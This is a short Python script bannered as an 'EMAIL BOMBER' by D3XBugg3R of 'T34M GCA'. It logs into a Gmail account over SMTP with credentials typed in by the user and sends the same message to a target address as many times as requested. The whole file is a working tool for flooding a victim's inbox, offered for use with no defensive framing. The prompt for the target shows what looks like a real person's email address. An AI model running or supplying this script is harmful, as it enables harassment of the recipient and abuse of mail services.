import smtplib
import time
print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By D3XBugg3R                  \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|            With <3 of T34M GCA             \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

try:
    bomb_email = input("akashmathew916@gmail.com ")
    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("are you happy:")
    counter = int(input("How many message you want to send?:"))

    for x in range(0,counter):
        print("25 : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")
